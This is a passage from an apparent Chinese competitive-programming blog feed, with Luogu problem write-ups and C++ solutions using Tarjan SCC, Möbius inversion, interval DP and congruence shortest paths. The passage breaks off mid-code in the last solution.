<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">4000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Edge</span> *edges;</span><br><span class="line">    <span class="type">int</span> dfn, low;</span><br><span class="line">    <span class="type">bool</span> visited;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Connected</span> *connected;</span><br><span class="line">&#125; N[<span class="number">2</span> * MAXN];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *from, *to;</span><br><span class="line">    Edge *next;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *from, Node *to) : <span class="built_in">from</span>(from), <span class="built_in">to</span>(to), <span class="built_in">next</span>(from-&gt;edges) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Connected</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125; connecteds[<span class="number">2</span> * MAXN];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">std::string girl[MAXN], boy[MAXN];</span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span> </span>&#123;</span><br><span class="line">    N[from].edges = <span class="keyword">new</span> <span class="built_in">Edge</span>(&amp;N[from], &amp;N[to]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(Node *x)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> num = <span class="number">0</span>, counts = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> std::stack&lt;Node *&gt; stk;</span><br><span class="line">    x-&gt;dfn = x-&gt;low = ++num;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);</span><br><span class="line">    x-&gt;visited = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge *edges = x-&gt;edges; edges; edges = edges-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!edges-&gt;to-&gt;dfn) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(edges-&gt;to);</span><br><span class="line">            x-&gt;low = std::<span class="built_in">min</span>(x-&gt;low, edges-&gt;to-&gt;low);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (edges-&gt;to-&gt;visited) &#123;</span><br><span class="line">            x-&gt;low = std::<span class="built_in">min</span>(x-&gt;low, edges-&gt;to-&gt;dfn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x-&gt;dfn == x-&gt;low) &#123;</span><br><span class="line">        counts++;</span><br><span class="line">        Node *y;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            y = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            y-&gt;visited = <span class="literal">false</span>;</span><br><span class="line">            y-&gt;connected = &amp;connecteds[counts];</span><br><span class="line">            connecteds[counts].size++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (x != y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; girl[i] &gt;&gt; boy[i];</span><br><span class="line">        mp[girl[i]] = <span class="number">2</span> * i;</span><br><span class="line">        mp[boy[i]] = <span class="number">2</span> * i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">addEdge</span>(mp[girl[i]], mp[boy[i]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        std::string g, b;</span><br><span class="line">        std::cin &gt;&gt; g &gt;&gt; b;</span><br><span class="line">        <span class="built_in">addEdge</span>(mp[b], mp[g]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span> * n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!N[i].dfn) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(&amp;N[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (N[mp[girl[i]]].connected == N[mp[boy[i]]].connected) <span class="built_in">puts</span>(<span class="string">&quot;Unsafe&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Safe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>Tarjan</tag>
        <tag>强连通分量</tag>
        <tag>洛谷</tag>
        <tag>国家集训队</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P2257」YY 的 GCD - 莫比乌斯反演</title>
    <url>/luogu-2257/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2257">洛谷链接</a></p>
<p>给定 <span class="math inline">\(N, M\)</span>，求 <span
class="math inline">\(1 \leq x \leq N\)</span>，<span
class="math inline">\(1 \leq y \leq M\)</span> 且 <span
class="math inline">\(\gcd(x, y)\)</span> 为质数的 <span
class="math inline">\((x, y)\)</span> 有多少对。</p>
<p>数据范围：<span class="math inline">\(T = 10^4\)</span>，<span
class="math inline">\(N, M \leq 10^7\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题要求求下列式子的值（<span
class="math inline">\(\text{Primes}\)</span> 为质数集合）：</p>
<p><span class="math display">\[
\sum_{x = 1}^n{ \sum_{y = 1}^m{[\gcd(x, y) \in \text{Primes}]} }
\]</span></p>
<p>看到单元函数我们可以尝试用莫比乌斯反演化简。</p>
<p>我们设函数 <span class="math inline">\(A(n, m) = \sum_{x = 1}^n{
\sum_{y = 1}^m{[\gcd(x, y) \in \text{Primes}]}
}\)</span>，进行一些化简即可得 <span class="math inline">\(A(n, m) =
\sum_{ k \in \text{Primes} }{ \sum_{x = 1}^n{ \sum_{y = 1}^m{[\gcd(x, y)
= k]} } }\)</span>，显然 <span class="math inline">\(A(n, m)\)</span>
即为答案。</p>
<p>对于 <span class="math inline">\(A(n, m)\)</span>
这个函数的整体不好化简，我们可以先把 <span class="math inline">\(A(n,
m)\)</span> 拆出来。我们设下列函数：</p>
<p><span class="math display">\[
f(k) = \sum_{x = 1}^n{ \sum_{y = 1}^m{[\gcd(x, y) = k]} }
\]</span></p>
<p>显然 <span class="math inline">\(A(n, m) = \sum_{k \in
Primes}{f(k)}\)</span>，故问题转化成了化简 <span
class="math inline">\(f(k)\)</span>。</p>
<p>我们可以尝试用莫比乌斯反演化简 <span
class="math inline">\(f(k)\)</span>。设下列函数：</p>
<p><span class="math display">\[
\begin{align*}
F(k) &amp;= \sum_{k | d}{f(d)} \\
&amp;= \sum_{k | d}{ \sum_{x = 1}^n{ \sum_{y = 1}^m{[\gcd(x, y) = d]} }
} \\
&amp;= \sum_{t = 1}^{\min\{ \lfloor \frac{n}{k} \rfloor , \lfloor
\frac{m}{k} \rfloor \} }{ \sum_{x = 1}^n{ \sum_{y = 1}^m{[\gcd(x, y) =
tk]} } } \\
&amp;= \sum_{x = 1}^n{ \sum_{y = 1}^m{[k | \gcd(x, y)]} } \\
&amp;= \sum_{x = 1}^n{ \sum_{y = 1}^m{[k | x][k | y]} } \\
&amp;= \lfloor \frac{n}{k} \rfloor \lfloor \frac{m}{k} \rfloor
\end{align*} \\
\]</span></p>
<p>由于 <span class="math inline">\(F(k) = \sum_{k |
d}{f(d)}\)</span>，我们可以进行莫比乌斯反演：</p>
<p><span class="math display">\[
\begin{align*}
f(k) &amp;= \sum_{k | d}{ \mu(\frac{d}{k}) F(d) } \\
&amp;= \sum_{k | d}{ \mu(\frac{d}{k}) \lfloor \frac{n}{d} \rfloor
\lfloor \frac{m}{d} \rfloor } \\
&amp;= \sum_{t = 1}^{ \min\{ \lfloor \frac{n}{k} \rfloor , \lfloor
\frac{m}{k} \rfloor \} }{ \mu(t) \lfloor \frac{n}{tk} \rfloor \lfloor
\frac{m}{tk} \rfloor }
\end{align*}
\]</span></p>
<p>于是我们可以得出：</p>
<p><span class="math display">\[
A(n, m) = \sum_{k \in Primes}{ \sum_{t = 1}^{ \min\{ \lfloor \frac{n}{k}
\rfloor , \lfloor \frac{m}{k} \rfloor \} }{ \mu(t) \lfloor \frac{n}{tk}
\rfloor \lfloor \frac{m}{tk} \rfloor } }
\]</span></p>
<p>但现在直接求 <span class="math inline">\(A(n, m)\)</span> 显然会
TLE，我们需要进行进一步优化。</p>
<p>我们发现在 <span class="math inline">\(A(n, m)\)</span> 中大量出现
<span class="math inline">\(tk\)</span>，我们可以尝试把 <span
class="math inline">\(tk\)</span> 提出来：</p>
<p><span class="math display">\[
\begin{align*}
A(n, m) &amp;= \sum_{k \in Primes}{ \sum_{t = 1}^{ \min\{ \lfloor
\frac{n}{k} \rfloor , \lfloor \frac{m}{k} \rfloor \} }{ \mu(t) \lfloor
\frac{n}{tk} \rfloor \lfloor \frac{m}{tk} \rfloor } } \\
&amp;= \sum_{x = 1}^{ \min\{n, m\} }{ \sum_{ k | x, k \in \text{Primes}
}{ \mu(\frac{x}{k}) \lfloor \frac{n}{x} \rfloor \lfloor \frac{m}{x}
\rfloor } } \\
&amp;= \sum_{x = 1}^{ \min\{n, m\} }{  \lfloor \frac{n}{x} \rfloor
\lfloor \frac{m}{x} \rfloor \sum_{ k | x, k \in \text{Primes} }{
\mu(\frac{x}{k}) } }
\end{align*}
\]</span></p>
<p>对于 <span class="math inline">\(\sum_{ k | x, k \in \text{Primes} }{
\mu(\frac{x}{k}) }\)</span>，我们可以在预处理 <span
class="math inline">\(\mu(n)\)</span>
过后预处理该式，然后对该式作前缀和。最后再用数论分块求 <span
class="math inline">\(A(n, m)\)</span> 即可。每次询问的时间复杂度为
<span class="math inline">\(O(\sqrt{n})\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e7</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> isNotPrime[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> mu[MAXN + <span class="number">1</span>], primes[MAXN + <span class="number">1</span>], cnt;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sumMu[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">getPrimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    isNotPrime[<span class="number">0</span>] = isNotPrime[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    mu[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isNotPrime[i]) &#123;</span><br><span class="line">            primes[++cnt] = i;</span><br><span class="line">            mu[i] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cnt; j++) &#123;</span><br><span class="line">            <span class="type">int</span> t = i * primes[j];</span><br><span class="line">            <span class="keyword">if</span> (t &gt; MAXN) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            isNotPrime[t] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                mu[t] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> mu[t] = -mu[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; primes[i] * j &lt;= MAXN; j++) &#123;</span><br><span class="line">            sumMu[primes[i] * j] += mu[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) sumMu[i] += sumMu[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>, r = <span class="number">0</span>; l &lt;= std::<span class="built_in">min</span>(n, m); l = r + <span class="number">1</span>) &#123;</span><br><span class="line">        r = std::<span class="built_in">min</span>(n / (n / l), m / (m / l));</span><br><span class="line">        ans += (sumMu[r] - sumMu[l - <span class="number">1</span>]) * (n / l) * (m / l);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">getPrimes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">f</span>(n, m));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线性筛</tag>
        <tag>莫比乌斯反演</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P1436」棋盘分割 - 区间 DP</title>
    <url>/luogu-1436/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1436">洛谷链接</a></p>
<p>将一个 <span class="math inline">\(8 \times 8\)</span>
的棋盘进行如下分割：将原棋盘割下一块矩形棋盘并使剩下部分也是矩形，再将剩下的两部分中的任意一块继续如此分割，这样割了
<span class="math inline">\(n - 1\)</span>
次后，连同最后剩下的矩形棋盘共有 <span class="math inline">\(n\)</span>
块矩形棋盘。(每次切割都只能沿着棋盘格子的边进行)</p>
<img src="/luogu-1436/p1436.png" class="">
<p>原棋盘上每一格有一个分值，一块矩形棋盘的总分为其所含各格分值之和。现在需要把棋盘按上述规则分割成
<span class="math inline">\(n\)</span>
块矩形棋盘，并使各矩形棋盘总分的平方和最小。</p>
<p>请编程对给出的棋盘及 <span class="math inline">\(n\)</span>
，求出平方和的最小值。</p>
<p>数据范围：<span class="math inline">\(1 \leq n \leq 15\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这道题可以用区间 DP 来做。我们定义如下状态：</p>
<p><span class="math display">\[
f_{i, l, d, r, u} \quad i, l, d, r, u \in [1, 8] \cap \mathbb{Z} \wedge
l \leq r \wedge d \leq u
\]</span></p>
<p>这个状态表示在这个棋盘中，从左下角 <span class="math inline">\((l,
d)\)</span> 到右上角 <span class="math inline">\((r, u)\)</span>
所构成的矩形被拆成 <span class="math inline">\(i\)</span>
个矩形后平方和最小值。</p>
<p>我们将 <span class="math inline">\(f_{1, l, d, r, u}\)</span>
初始化为 <span class="math inline">\((l, d) \rightarrow (r, u)\)</span>
这个矩形的总分平方和。</p>
<p>对于一个矩形，我们只能横切或竖切分割成两个矩形，于是可以得到下列动态转移方程：</p>
<p><span class="math display">\[
\begin{cases}
f_{i, l, d, r, u} = \min \limits_{l \leq j \leq r} \{ f_{i - 1, l, d, j,
u} + f_{1, j + 1, d, r, u}, f_{1, l, d, j, u} + f_{i - 1, j + 1, d, r,
u} \} \\
f_{i, l, d, r, u} = \min \limits_{l \leq j \leq r} \{ f_{i - 1, l, d, r,
j} + f_{1, l, j + 1, r, u}, f_{1, l, d, r, j} + f_{i - 1, l, j + 1, r,
u} \}
\end{cases}
\]</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXB = <span class="number">8</span>, MAXN = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> board[MAXB + <span class="number">1</span>][MAXB + <span class="number">1</span>], s[MAXB + <span class="number">1</span>][MAXB + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> f[MAXN + <span class="number">1</span>][MAXB + <span class="number">1</span>][MAXB + <span class="number">1</span>][MAXB + <span class="number">1</span>][MAXB + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">getTri</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> d, <span class="type">int</span> r, <span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s[r][u] - s[r][d - <span class="number">1</span>] - s[l - <span class="number">1</span>][u] + s[l - <span class="number">1</span>][d - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">pow</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXB; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= MAXB; j++) &#123;</span><br><span class="line">            s[i][j] = s[i - <span class="number">1</span>][j] + s[i][j - <span class="number">1</span>] - s[i - <span class="number">1</span>][j - <span class="number">1</span>] + board[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>; l &lt;= MAXB; l++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">1</span>; d &lt;= MAXB; d++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> r = l; r &lt;= MAXB; r++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> u = d; u &lt;= MAXB; u++) &#123;</span><br><span class="line">                    f[<span class="number">1</span>][l][d][r][u] = <span class="built_in">pow</span>(<span class="built_in">getTri</span>(l, d, r, u));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>; l &lt;= MAXB; l++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">1</span>; d &lt;= MAXB; d++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> r = l; r &lt;= MAXB; r++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> u = d; u &lt;= MAXB; u++) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> j = l; j &lt; r; j++) f[i][l][d][r][u] = std::<span class="built_in">min</span>(f[i][l][d][r][u], std::<span class="built_in">min</span>(f[i - <span class="number">1</span>][l][d][j][u] + f[<span class="number">1</span>][j + <span class="number">1</span>][d][r][u], f[<span class="number">1</span>][l][d][j][u] + f[i - <span class="number">1</span>][j + <span class="number">1</span>][d][r][u]));</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> j = d; j &lt; u; j++) f[i][l][d][r][u] = std::<span class="built_in">min</span>(f[i][l][d][r][u], std::<span class="built_in">min</span>(f[i - <span class="number">1</span>][l][d][r][j] + f[<span class="number">1</span>][l][j + <span class="number">1</span>][r][u], f[<span class="number">1</span>][l][d][r][j] + f[i - <span class="number">1</span>][l][j + <span class="number">1</span>][r][u]));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXB; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= MAXB; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;board[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dp</span>();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; f[n][<span class="number">1</span>][<span class="number">1</span>][MAXB][MAXB] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>洛谷</tag>
        <tag>区间 DP</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P2371」墨墨的等式 - 最短路</title>
    <url>/luogu-2371/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2371">洛谷链接</a></p>
<p>墨墨突然对等式很感兴趣，他正在研究 <span
class="math inline">\(\sum_{i = 1}^n a_i x_i = b\)</span>
存在非负整数解的条件，他要求你编写一个程序，给定 <span
class="math inline">\(n, a_{1 \dots n}, l, r\)</span> 求出有多少 <span
class="math inline">\(b \in [l, r]\)</span>
可以使等式存在非负整数解。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题看似可以用完全背包可解，但由于该数据范围，肯定 T 飞。</p>
<p>于是我们可以采用图论方法来解这道题。</p>
<p>解决本题需要了解 <strong>同余最短路</strong>
这个知识。具体同余最短路是什么，我们可以用本题举例。</p>
<p>首先我们要做的是确定一个数 <span
class="math inline">\(x\)</span>，表示为加其他数等同于加 <span
class="math inline">\(x\)</span> 和 <span
class="math inline">\(x\)</span> 的余数。在这里可以定义 <span
class="math inline">\(x = \min \limits_{1 \leq j \leq n}
a_j\)</span>，且对于 <span class="math inline">\(\forall i \in N \wedge
i &lt; x\)</span>，计算出满足该题非负整数解条件的 <span
class="math inline">\(b\)</span> 的最小值为 <span
class="math inline">\(\text{dis}_i\)</span></p>
<p>具体怎么计算 <span
class="math inline">\(\text{dis}_i\)</span>，我们可以建立一张图。对于
<span class="math inline">\(\forall i \in N \wedge i &lt;
n\)</span>，建立连向 <span class="math inline">\((i + a_j) \mod
x\)</span> 的权值为 <span class="math inline">\(a_j\)</span>
的边。这条边表明我们可通过将当前 <span class="math inline">\(\mod
x\)</span> 的数加上 <span class="math inline">\(a_j\)</span> 转化成
<span class="math inline">\(\mod x = (i + a_j) \mod x\)</span>
的数。</p>
<p>接下来我们从 <span class="math inline">\(0\)</span>
出发求最短路。求出的最短路 <span
class="math inline">\(\text{dis}_i\)</span> 即为满足该数 <span
class="math inline">\(\mod n = i\)</span> 且满足该题非负整数解条件的
<span class="math inline">\(b\)</span> 的最小值。</p>
<p>最后对于 <span class="math inline">\(b \mod x =
i\)</span>，若我们总共有 <span class="math inline">\(\lfloor \frac{h -
\text{dis}_i}{x} \rfloor + 1\)</span> 种满足小于等于 <span
class="math inline">\(h\)</span>
且符合条件的情况。最后将所有余数的情况相加即为答案。</p>
<p>对于本题，我们可以先分别算出小于等于 <span
class="math inline">\(r\)</span> 的情况总数和小于等于 <span
class="math inline">\(l - 1\)</span>
的情况总数，由于两者重复，我们仅需将两情况数相减即为 <span
class="math inline">\(l \leq b \leq r\)</span> 的情况总数。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">500000</span>;</span><br><span class="line"></span><br><span class="line">std::vector&lt; std::pair&lt;<span class="type">int</span>, <span class="type">long</span> <span class="type">long</span>&gt; &gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dis[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> ver)</span> </span>&#123;</span><br><span class="line">    e[from].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(to, ver) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">spfa</span><span class="params">(<span class="type">int</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="type">static</span> <span class="type">bool</span> vis[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dis, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(dis));</span><br><span 